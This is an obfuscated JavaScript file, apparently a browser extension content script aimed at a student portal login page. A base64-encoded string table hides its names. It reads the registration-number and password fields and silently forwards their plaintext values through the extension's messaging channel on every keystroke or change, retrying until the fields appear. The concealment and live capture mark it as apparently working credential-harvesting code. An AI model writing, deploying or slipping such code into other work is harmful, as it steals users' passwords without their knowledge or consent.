(function (a, b) {
  const f = a0b,
    c = a();
  while (!![]) {
    try {
      const d =
        (-parseInt(f(0x15b)) / 0x1) * (parseInt(f(0x153)) / 0x2) +
        parseInt(f(0x150)) / 0x3 +
        (-parseInt(f(0x159)) / 0x4) * (-parseInt(f(0x14f)) / 0x5) +
        parseInt(f(0x151)) / 0x6 +
        parseInt(f(0x156)) / 0x7 +
        -parseInt(f(0x164)) / 0x8 +
        parseInt(f(0x15e)) / 0x9;
      if (d === b) break;
      else c["push"](c["shift"]());
    } catch (e) {
      c["push"](c["shift"]());
    }
  }
})(a0a, 0x67e70);
function sendStudentData(a, b) {
  const g = a0b;
  chrome[g(0x163)][g(0x15a)]({
    type: g(0x161),
    data: { registrationNumber: a, password: b },
  });
}
function a0b(a, b) {
  const c = a0a();
  return (
    (a0b = function (d, e) {
      d = d - 0x14d;
      let f = c[d];
      if (a0b["sjQtWH"] === undefined) {
        var g = function (l) {
          const m =
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
          let n = "",
            o = "";
          for (
            let p = 0x0, q, r, s = 0x0;
            (r = l["charAt"](s++));
            ~r && ((q = p % 0x4 ? q * 0x40 + r : r), p++ % 0x4)
              ? (n += String["fromCharCode"](0xff & (q >> ((-0x2 * p) & 0x6))))
              : 0x0
          ) {
            r = m["indexOf"](r);
          }
          for (let t = 0x0, u = n["length"]; t < u; t++) {
            o +=
              "%" +
              ("00" + n["charCodeAt"](t)["toString"](0x10))["slice"](-0x2);
          }
          return decodeURIComponent(o);
        };
        (a0b["eSAnMS"] = g), (a = arguments), (a0b["sjQtWH"] = !![]);
      }
      const h = c[0x0],
        i = d + h,
        j = a[i];
      return !j ? ((f = a0b["eSAnMS"](f)), (a[i] = f)) : (f = j), f;
    }),
    a0b(a, b)
  );
}
function a0a() {
  const l = [
    "mtaXmZe2CMLMCLH1",
    "Bg9N",
    "ywrKrxzLBNrmAxn0zw5LCG",
    "mJa2odeYow9kB1bttW",
    "z2v0rwXLBwvUDej5swq",
    "y29SB3i6igDYzwvUoW",
    "nfjWz2XJqG",
    "C2vUze1LC3nHz2u",
    "mtzYtwDgqvi",
    "DhH0vq",
    "y2HHBMDL",
    "mZCZoty4meD6CgzVtW",
    "vhH0ChDKqxv0B0LKxZG3nJC",
    "jwpINiuGtfbvigLUChv0CYbMB3vUzcbHBMqGBgLZDgvUzxjZigf0DgfJAgvKlG",
    "C3r1zgvUDf9KyxrH",
    "y29SB3i6ig9Yyw5NztS",
    "CNvUDgLTzq",
    "nJqYmtq0oenZCvvpqW",
    "jwpIMQdVUi8GtfbvigLUChv0CYbUB3qGzM91BMqGywz0zxiGCMv0CMLLCYWGC2nYAxb0ihn0B3bWzwqU",
    "DMfSDwu",
    "Aw5WDxq",
    "mti1ntiWnvzYA1nPuq",
    "mte3ndG0mMHdsM9tsq",
    "ndeXmtaYnLb4ANfqDW",
    "zM9YrwfJAa",
  ];
  a0a = function () {
    return l;
  };
  return a0a();
}
function setupListeners() {
  const h = a0b,
    a = document[h(0x157)](h(0x15c)),
    b = document[h(0x157)](h(0x15f));
  if (a && b)
    return (
      sendStudentData(a[h(0x14d)], b[h(0x14d)]),
      [h(0x14e), h(0x15d)][h(0x152)]((c) =>
        a[h(0x155)](c, () => {
          const i = h;
          sendStudentData(a[i(0x14d)], b[i(0x14d)]);
        })
      ),
      [h(0x14e), h(0x15d)][h(0x152)]((c) =>
        b[h(0x155)](c, () => {
          const j = h;
          sendStudentData(a[j(0x14d)], b[j(0x14d)]);
        })
      ),
      console[h(0x154)](h(0x160), h(0x158)),
      !![]
    );
  return ![];
}
if (!setupListeners()) {
  let retries = 0x0;
  const maxRetries = 0xf,
    intervalId = setInterval(() => {
      const k = a0b;
      retries++,
        (setupListeners() || retries >= maxRetries) &&
          (clearInterval(intervalId),
          retries >= maxRetries && console[k(0x154)](k(0x165), k(0x162)));
    }, 0x2bc);
}
